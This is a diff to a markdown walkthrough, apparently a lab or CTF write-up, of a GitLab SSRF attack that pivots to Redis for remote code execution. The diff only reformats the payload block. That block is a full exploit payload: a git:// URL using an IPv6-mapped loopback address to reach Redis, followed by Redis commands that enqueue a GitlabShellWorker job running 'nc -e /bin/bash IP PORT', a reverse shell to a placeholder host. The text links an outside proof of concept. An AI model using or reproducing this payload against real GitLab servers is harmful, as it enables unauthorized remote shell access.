@@ -81,8 +81,8 @@ Now before pressing the `save` button, setting up proxy and turn on the intercep
 After `Intercepting` the request, let's replace `import_url` parameter by the following payload:
 
 ```
-{
- git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
+
+git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
  multi
  sadd resque:gitlab:queues system_hook_push
  lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|nc -e /bin/bash IP PORT\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
@@ -90,7 +90,7 @@ After `Intercepting` the request, let's replace `import_url` parameter by the fo
  exec
  exec
 /ssrf.git
-}
+
 ```
 Make sure to check the [POC](https://github.com/jas502n/gitlab-SSRF-redis-RCE) for `RCE via SSRF`, I got the above payload after making some changes. (*Make sure you check the gaps specified in the POC, or else the playload won't work **It didn't work in my case** .*)
 
